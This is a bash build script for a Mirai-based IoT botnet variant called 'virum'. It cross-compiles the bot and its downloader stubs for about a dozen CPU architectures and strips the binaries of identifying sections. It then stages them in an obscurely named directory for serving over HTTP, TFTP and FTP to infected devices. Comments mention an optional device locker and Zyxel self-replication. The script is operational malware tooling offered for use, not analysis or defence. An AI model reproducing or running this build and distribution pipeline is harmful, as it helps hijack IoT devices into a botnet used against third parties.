#!/bin/bash
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

FLAGS=""
rm -rf /root/virum-0/loader/bins/
rm -rf /root/virum-0/release
mkdir /root/virum-0/release
mkdir /root/virum-0/dlr/release
rm -rf /var/www/html/swrgiuhguhwrguiwetu
rm -rf /var/lib/tftpboot
rm -rf /var/ftp

# mkdir /var/www/html
# mkdir /var/www/html/358835865482368
# mkdir /var/www/html/358835865482368w482582
# mkdir /var/www/html/358835865482368w4857w489rt9724
# mkdir /var/www/html/3588358654823689823474932
#mkdir /var/www/html/1234784525247
#mkdir /var/www/html/3234572452482745274852478752745
#mkdir /var/www/html/358835865482368213874324893192
#mkdir /var/www/html/3erggggggggggggggggggggggggggggsdvfuisdfhifgu
#mkdir /var/www/html/3245985245724857248957rgiujgjuesfrgiurwgh
#mkdir /var/www/html/13747243572475
#mkdir /var/www/html/swrgiuhguhwrguiwetu
#mkdir /var/www/html/we7yr234r243
#mkdir /var/www/html/98wertu2489wut4w98tu249857248952
#mkdir /var/www/html/iswreuhftgwruifhw9834
#mkdir /var/ftp
#mkdir /var/lib/tftpboot
#mkdir /var/www/html
#mkdir /var/www/html/yesnt
#mkdir /var/www/html/swrgiuhguhwrguiwetu
#mkdir /var/www/html/bins
mkdir /root/swrgiuhguhwrguiwetu



echo "Initializing virum (Loro/Hito Variant) Installation, enjoy... :D"
# To Enable Locker Include -DLOCK on Each compile_bot Stage.
# Zyxel Self-rep is Disabled By Default, To Enable Include -DZYXEL on Each compile_bot Stage.
echo "[BOT] Compiling bin=[i586]"
compile_bot i586 x86 "-static $flags"
echo "[BOT] Compiling bin=[mips]"
compile_bot mips mips "-static $flags"
echo "[BOT] Compiling bin=[mipsel]"
compile_bot mipsel mpsl "-static $flags"
echo "[BOT] Compiling bin=[armv4l]"
compile_bot armv4l arm "-static $flags"
echo "[BOT] Compiling bin=[armv5l]"
compile_bot armv5l arm5 "$flags"
echo "[BOT] Compiling bin=[armv6l]"
compile_bot armv6l arm6 "-static $flags"
echo "[BOT] Compiling bin=[armv7l]"
compile_bot armv7l arm7 "-static $flags"
echo "[BOT] Compiling bin=[powerpc]"
compile_bot powerpc ppc "-static $flags"
echo "[BOT] Compiling bin=[sparc]"
compile_bot sparc spc "-static $flags"
echo "[BOT] Compiling bin=[m68k]"
compile_bot m68k m68k "-static $flags"
echo "[BOT] Compiling bin=[sh4]"
compile_bot sh4 sh4 "-static $flags"
echo "[BOT] Compiling bin=[DBG]"
gcc -std=c99 bot/*.c -DDEBUG  -static -g -o debug/mirai.dbg
cp release/* /root/swrgiuhguhwrguiwetu
# cp release/* /var/ftp
# mv release/* /var/lib/tftpboot
echo "[BOT] Compiled bins released to folder - 'swrgiuhguhwrguiwetu'"

gcc -static -O3 -lpthread -pthread /root/virum-0/loader/src/*.c -o /root/virum-0/loader/loader

armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/virum-0/dlr/main.c -o /root/virum-0/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/virum-0/dlr/main.c -o /root/virum-0/dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/virum-0/dlr/main.c -o /root/virum-0/dlr/release/dlr.arm6
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/virum-0/dlr/main.c -o /root/virum-0/dlr/release/dlr.arm7
i586-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/virum-0/dlr/main.c -o /root/virum-0/dlr/release/dlr.x86
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/virum-0/dlr/main.c -o /root/virum-0/dlr/release/dlr.m68k
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/virum-0/dlr/main.c -o /root/virum-0/dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/virum-0/dlr/main.c -o /root/virum-0/dlr/release/dlr.mpsl
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/virum-0/dlr/main.c -o /root/virum-0/dlr/release/dlr.ppc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/virum-0/dlr/main.c -o /root/virum-0/dlr/release/dlr.sh4
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/virum-0/dlr/main.c -o /root/virum-0/dlr/release/dlr.spc
armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/virum-0/dlr/release/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/virum-0/dlr/release/dlr.arm5
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/virum-0/dlr/release/dlr.arm6
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/virum-0/dlr/release/dlr.arm7
i586-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/virum-0/dlr/release/dlr.x86
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/virum-0/dlr/release/dlr.m68k
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/virum-0/dlr/release/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/virum-0/dlr/release/dlr.mpsl
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/virum-0/dlr/release/dlr.ppc
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/virum-0/dlr/release/dlr.sh4
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/virum-0/dlr/release/dlr.spc
mkdir /root/virum-0/loader/bins
mv /root/virum-0/dlr/release/dlr* /root/virum-0/loader/bins
rm -rf /root/virum-0/release
ulimit -n999999
ulimit -u999999
ulimit -e999999

cd loader/
cd /root/virum-0/
cd /root/virum-0/
cd tools/
chmod 777 *
cd /root/virum-0/
echo "HTML, TFTP AND FTP Bins stored in /root/swrgiuhguhwrguiwetu if you are willing to set all bins in this server just copy this command."
echo "cp /root/swrgiuhguhwrguiwetu /var/www/html && cp /root/swrgiuhguhwrguiwetu /var/tftp && cp /root/swrgiuhguhwrguiwetu /var/lib/tftpboot"
sh Screener.sh
